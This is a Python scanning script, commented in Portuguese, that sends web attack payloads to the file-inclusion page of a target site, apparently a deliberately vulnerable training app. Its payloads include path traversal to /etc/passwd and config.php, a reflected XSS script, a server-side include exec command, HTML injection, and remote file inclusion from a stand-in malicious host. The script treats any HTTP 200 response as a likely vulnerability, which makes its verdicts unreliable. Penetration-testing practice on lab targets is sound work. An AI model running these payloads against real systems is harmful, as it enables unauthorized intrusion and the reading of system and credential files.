import requests
from bs4 import BeautifulSoup
import sys
import os
import time
import json

if len(sys.argv) > 2:
    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
else:
    print("URL base e/ou taxa de envio não foram fornecidas.")
    sys.exit(1)

# Mapeia a taxa de envio para um intervalo de tempo específico
delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida

# Construir a URL alvo usando a URL base e o nome da página
url_alvo = f"{url_base}/index.php?page=arbritary-file-inclusion.php"
print(url_alvo)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# Payloads para testar
payloads = {
    'System File Compromise': "../../../../etc/passwd",
    'Load Any Page': "https://www.example.com/",
    'Reflected XSS': "<script>alert('XSS')</script>",
    'Server-Side Includes': "<!--#exec cmd='ls'-->",
    'HTML Injection': "<h1>HTML Injection</h1>",
    'Remote File Inclusion': "http://malicious.com/malicious_script.php",
    'Local File Inclusion': "../../../../var/www/html/config.php",
}

# Função para enviar a requisição e verificar a resposta
def enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, teste_numero):
    resposta_teste = requests.get(url_completa, headers=headers)

    print(f"Teste {teste_numero}: Testando '{tipo_vulnerabilidade}'. Código de status: {resposta_teste.status_code}")
    
    if resposta_teste.status_code == 200:
        print(f"Teste #{teste_numero} PASSOU: Vulnerabilidade de '{tipo_vulnerabilidade}' possivelmente encontrada!")
        return 1
    else:
        print(f"Teste #{teste_numero} FALHOU: Código de status: {resposta_teste.status_code}.")
        return 0
    
# Contadores para os resultados dos testes
total_testes = 0
testes_passaram = 0
testes_falharam = 0

# Realizar os testes
for tipo_vulnerabilidade, payload in payloads.items():
    total_testes += 1
    payload_encoded = requests.utils.quote(payload)
    url_completa = f"{url_alvo}&page={payload_encoded}"
    resultado_teste = enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, total_testes)
    if resultado_teste == 1:
        testes_passaram += 1
    else:
        testes_falharam += 1
    time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio

#Imprimindo os resultados
resultados = {
    'nome_script': 'Nome do Script',
    'total_testes': total_testes,
    'testes_passaram': testes_passaram,
    'testes_falharam': testes_falharam,
    'url_testada': url_alvo
}
resultados_json = json.dumps(resultados)

# Imprimindo a string JSON
print(resultados_json)